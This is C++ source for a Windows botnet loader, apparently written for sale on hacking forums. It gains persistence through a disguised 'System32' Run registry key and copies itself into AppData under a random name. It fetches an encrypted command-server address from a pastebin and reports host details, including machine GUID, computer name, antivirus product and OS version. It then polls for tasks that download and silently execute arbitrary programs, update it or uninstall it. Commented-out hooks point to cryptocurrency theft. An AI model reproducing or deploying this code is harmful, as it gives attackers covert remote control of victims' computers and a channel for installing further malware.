#include <stdio.h>
#include <iostream>
#include <fstream>
#include "HTTPRequest.hpp"
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include "config.h"
#include <conio.h>
#include "CoinFinder.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")

/* ok nearing the final sections, almost time to release and make a shit ton of money with this pile of crap on slackforums! */

std::string responseToString(http::Response response) {
	char* gateFromPatebin = (char*)malloc(response.body.size() + 1);
	memcpy(gateFromPatebin, response.body.data(), response.body.size());
	gateFromPatebin[response.body.size()] = '\0';
	std::string responseFromGateString = gateFromPatebin;
	free(gateFromPatebin);
	return responseFromGateString;
}

std::string getHWID() {
	HW_PROFILE_INFO hwProfileInfo;
	if (GetCurrentHwProfile(&hwProfileInfo)) {
		return (std::string)hwProfileInfo.szHwProfileGuid;
	}
	else {
		return "unknow";
	}
}

std::string getComputerName() {
	TCHAR chrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
	std::string strRetVal;
	DWORD dwBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
	if (GetComputerName(chrComputerName, &dwBufferSize)) {
		strRetVal = chrComputerName;
	}
	else {
		strRetVal = "";
	}
	return(strRetVal);
}

std::string downloadFile(std::string url, std::string file) {
	const char* strUrl = url.c_str();
	const char* target = file.c_str();
	HRESULT hr = URLDownloadToFile(NULL, strUrl, target, 0, NULL);
	if (FAILED(hr)) {
		return "failed";
	}
	return "ok";
}

std::vector<std::string> explode(const std::string & delimiter, const std::string & str) {
	std::vector<std::string> arr;
	int strleng = str.length();
	int delleng = delimiter.length();
	if (delleng == 0)
		return arr;//no change
	int i = 0;
	int k = 0;
	while (i < strleng)
	{
		int j = 0;
		while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
			j++;
		if (j == delleng)//found delimiter
		{
			arr.push_back(str.substr(k, i - k));
			i += delleng;
			k = i;
		}
		else {
			i++;
		}
	}
	arr.push_back(str.substr(k, i - k));
	return arr;
}

bool replace(std::string & str, const std::string & from, const std::string & to) {
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}

std::string RandomString(int len) {
	srand((unsigned int)time(NULL));
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string newstr;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

std::string startNewProcess(std::string file) {
	STARTUPINFO si = {};
	si.cb = sizeof si;

	PROCESS_INFORMATION pi = {};
	const TCHAR* target = TEXT(file.c_str());

	if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
	{
		std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
		return "failed";
	}
	else {
		std::cout << "Process Executed Success" << std::endl;
		return "success";
	}

	std::cin.sync();
	std::cin.ignore();
}

bool GetWinMajorMinorVersion(DWORD & major, DWORD & minor) {
	bool bRetCode = false;
	LPBYTE pinfoRawData = 0;
	if (NERR_Success == NetWkstaGetInfo(NULL, 100, &pinfoRawData))
	{
		WKSTA_INFO_100* pworkstationInfo = (WKSTA_INFO_100*)pinfoRawData;
		major = pworkstationInfo->wki100_ver_major;
		minor = pworkstationInfo->wki100_ver_minor;
		::NetApiBufferFree(pinfoRawData);
		bRetCode = true;
	}
	return bRetCode;
}

std::string GetWindowsVersionString() {
	std::string     winver;
	OSVERSIONINFOEX osver;
	SYSTEM_INFO     sysInfo;
	typedef void(__stdcall * GETSYSTEMINFO) (LPSYSTEM_INFO);

	__pragma(warning(push))
		__pragma(warning(disable:4996))
		memset(&osver, 0, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	GetVersionEx((LPOSVERSIONINFO)& osver);
	__pragma(warning(pop))
		DWORD major = 0;
	DWORD minor = 0;
	if (GetWinMajorMinorVersion(major, minor))
	{
		osver.dwMajorVersion = major;
		osver.dwMinorVersion = minor;
	}
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2) {
		OSVERSIONINFOEXW osvi;
		ULONGLONG cm = 0;
		cm = VerSetConditionMask(cm, VER_MINORVERSION, VER_EQUAL);
		ZeroMemory(&osvi, sizeof(osvi));
		osvi.dwOSVersionInfoSize = sizeof(osvi);
		osvi.dwMinorVersion = 3;
		if (VerifyVersionInfoW(&osvi, VER_MINORVERSION, cm))
		{
			osver.dwMinorVersion = 3;
		}
	}

	GETSYSTEMINFO getSysInfo = (GETSYSTEMINFO)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
	if (getSysInfo == NULL)  getSysInfo = ::GetSystemInfo;
	getSysInfo(&sysInfo);

	if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows 10 Server";
	if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 10";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012 R2";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8.1";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008 R2";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 7";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows Vista";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION
		&& sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)  winver = "Windows XP x64";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)   winver = "Windows Server 2003";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)   winver = "Windows XP";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)   winver = "Windows 2000";
	if (osver.dwMajorVersion < 5)   winver = "unknown";

	if (osver.wServicePackMajor != 0) {
		std::string sp;
		char buf[128] = { 0 };
		sp = " Service Pack ";
		sprintf_s(buf, sizeof(buf), "%hd", osver.wServicePackMajor);
		sp.append(buf);
		winver += sp;
	}

	return winver;
}

void addstartup()
{
	TCHAR path[100];
	GetModuleFileName(NULL, path, 100);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
	RegCloseKey(newValue);
}

std::string ExePath() {
	char result[MAX_PATH];
	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
}

std::string ExeDir() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	return std::string(buffer).substr(0, pos);
}

void removeRegInstallKey() {
	TCHAR path[100];
	GetModuleFileName(NULL, path, 100);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegDeleteValue(newValue, "System32");
	RegCloseKey(newValue);
}

void uninstall() {
	removeRegInstallKey();
	std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del " + ExePath() + "\"";
	ShellExecute(
		NULL,
		_T("open"),
		_T("cmd"),
		_T(remove.c_str()), // params                            
		_T(" C:\ "),
		SW_HIDE);
}

void update(std::string url) {
	std::string file((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe");
	downloadFile(url, file);
	ShellExecute(GetDesktopWindow(), "open", file.c_str(), NULL, NULL, SW_HIDE);
	uninstall();
}

std::string checkIfRegKeyExists(std::string key) {
	LONG lResult;
	HKEY hKey;
	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
	if (lResult != ERROR_SUCCESS) {
		if (lResult == ERROR_FILE_NOT_FOUND) {
			return "false";
		}
	}
	return "true";
}

std::string GetMachineGUID()
{
	std::string ret;
	char value[64];
	DWORD size = _countof(value);
	DWORD type = REG_SZ;
	HKEY key;
	LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
	LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
	if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
		ret = value;
	}
	::RegCloseKey(key);
	return ret;
}

std::string installedOrnot() {
	//Kill Current Place
	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe";
	//Check if Appdata Dir 
	size_t found = ExePath().find("Microsoft");
	if (found != std::string::npos) {
		return "installed";
	}
	else {
		//Uninstalled Copy To AppData & Execute
		BOOL b = CopyFile(ExePath().c_str(), installPath.c_str(), 0);
		if (!b) {
			std::cout << "Error: " << GetLastError() << std::endl;
			std::cout << "Error: " << ExePath() << std::endl;
		}
		else {
			std::cout << "Installed " << std::endl;
		}
		std::string rebootString = "start " + installPath;
		system(rebootString.c_str());
		return "restart";
	}
}

std::string& BstrToStdString(const BSTR bstr, std::string & dst, int cp = CP_UTF8) {
	if (!bstr)
	{
		// define NULL functionality. I just clear the target.
		dst.clear();
		return dst;
	}
	// request content length in single-chars through a terminating
	//  nullchar in the BSTR. note: BSTR's support imbedded nullchars,
	//  so this will only convert through the first nullchar.
	int res = WideCharToMultiByte(cp, 0, bstr, -1, NULL, 0, NULL, NULL);
	if (res > 0)
	{
		dst.resize(res);
		WideCharToMultiByte(cp, 0, bstr, -1, &dst[0], res, NULL, NULL);
	}
	else
	{    // no content. clear target
		dst.clear();
	}
	return dst;
}

std::string bstr_to_str(BSTR source) {
	_bstr_t wrapped_bstr = _bstr_t(source);
	int length = wrapped_bstr.length();
	char* char_array = new char[length];
	strcpy_s(char_array, length + 1, wrapped_bstr);
	return char_array;
}

std::string getCurrentAv() {
	std::string returnString;
	CoInitializeEx(0, 0);
	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
	IWbemLocator* locator = 0;
	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)& locator);
	IWbemServices* services = 0;
	wchar_t* name = L"root\\SecurityCenter2";
	if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
		//printf("Connected!\n");
		//Lets get system information
		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
		wchar_t* query = L"Select * From AntiVirusProduct";
		IEnumWbemClassObject* e = 0;
		if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
			//printf("Query executed successfuly!\n");
			IWbemClassObject* object = 0;
			ULONG u = 0;
			//lets enumerate all data from this table
			std::string antiVirus;
			while (e) {
				e->Next(WBEM_INFINITE, 1, &object, &u);
				if (!u) break;//no more data,end enumeration
				CComVariant cvtVersion;
				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
				//std::wcout << cvtVersion.bstrVal;
				returnString = bstr_to_str(cvtVersion.bstrVal);
			}
		}
		else
			printf("Error executing query!\n");
	}
	else
		printf("Connection error!\n");
	//Close all used data
	services->Release();
	locator->Release();
	CoUninitialize();

	return returnString;
}

std::string encryptDecrypt(std::string toEncrypt) {
	Config config;
	std::string output = toEncrypt;
	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ config.key[i % (sizeof(config.key) / sizeof(char))];

	return output;
}



#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
	int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
#endif
		Config config;




		//Check if the Bot is Running
		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically


		//Autostart && Clone
		if (config.startup == true) {
			std::string insatlled = installedOrnot();
			if (insatlled == "restart") {
				return 0;
			}
			addstartup();
		}

		//Main
		//std::cout << config.pastebinUrl;
		http::Request request(config.pastebinUrl);
		http::Response response = request.send("GET");
		std::string gateFromPatebin = encryptDecrypt(responseToString(response));
		std::string netFramework2 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
		std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
		std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
		std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
		std::string currentAV = getCurrentAv();
		//std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
		//std::thread t2(&CoinFinder::grabEthereum, CoinFinder());

		while (true) {
			try {
				http::Request request2(gateFromPatebin);
				http::Response respons2e = request2.send("POST",
					"hwid=" + GetMachineGUID() +
					"&username=" + encryptDecrypt(getComputerName()) +
					"&nf2=" + encryptDecrypt(netFramework2) +
					"&nf3=" + encryptDecrypt(netFramework3) +
					"&nf35=" + encryptDecrypt(netFramework35) +
					"&nf4=" + encryptDecrypt(netFramework4) +
					"&av=" + currentAV +
					"&os=" + GetWindowsVersionString() +
					"&botversion=" + encryptDecrypt("2.0"),
					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
				);
				std::cout << responseToString(respons2e); 
				std::string responseFromGate = responseToString(respons2e);
				//TODO Handle Tasks Function
				//Java Support?
				//32x64 Bit CPU (&& Model?)
				std::cout << responseFromGate;
				std::string substring = "newtask";
				if (responseFromGate.find(substring) != std::string::npos) {
					std::vector<std::string> v = explode(";", responseFromGate);
					std::cout << "New Task Found \n";
					std::string random_str = RandomString(10);
					std::string url(v[2]);
					std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
					std::cout << file;
					std::cout << "\n";
					std::cout << url;
					downloadFile(url, file);
					std::string started = startNewProcess(file);
					http::Request request2(gateFromPatebin);
					http::Response respons2e = request2.send("POST",
						"hwid=" + getHWID() +
						"&username=" + getComputerName() +
						"&ps=" + started +
						"&id=" + v[1],
						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
					);
					std::cout << started;
				}
				else {
					if (responseFromGate.find("uninstall") != std::string::npos) {
						//t1.detach();
						//t2.detach();
						uninstall();
						return 0;
					}
					else if (responseFromGate.find("update") != std::string::npos) {
						std::cout << "Update Found  \n";
						std::vector<std::string> v = explode(";", responseFromGate);
						//t1.detach();
						//t2.detach();
						update(v[2]);
						return 0;
					}
					else {
						std::cout << "No new Task \n";
					}
				}
			}
			catch (const std::exception & e) {
				std::cerr << "Request failed, error: " << e.what() << std::endl;
			}
			Sleep(10000);
		}
	}
